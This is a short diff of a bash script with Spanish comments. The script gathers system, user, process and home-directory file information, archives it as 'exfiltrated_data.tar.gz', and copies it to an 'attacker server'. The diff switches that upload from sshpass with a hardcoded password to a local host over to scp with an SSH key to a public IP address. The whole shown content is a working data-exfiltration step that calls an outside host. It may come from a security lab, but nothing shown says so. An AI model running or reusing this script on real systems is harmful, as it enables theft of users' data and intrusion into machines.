@@ -29,8 +29,8 @@ find /home/* -type f -exec ls -lh {} \; | awk '{print $9, $5, $1}' > /tmp/files_
 echo "[+] Comprimendo los archivos..."
 tar -czf /tmp/exfiltrated_data.tar.gz /tmp/system_info.txt /tmp/user_info.txt /tmp/processes_info.txt /tmp/files_info.txt
 
-# Enviar el archivo al atacante usando sshpass y scp
+# Enviar el archivo al atacante usando clave SSH y scp
 echo "[+] Enviando los archivos al servidor atacante..."
-sshpass -p "changeme" scp /tmp/exfiltrated_data.tar.gz vboxuser@192.168.1.82:/home/vboxuser/exfiltrated_data
+scp -i /path/to/Debian-Ataque_key.pem /tmp/exfiltrated_data.tar.gz azureuser@20.255.51.174:/home/azureuser/exfiltrated_data
 
 echo "[+] Proceso completo. Información exfiltrada."
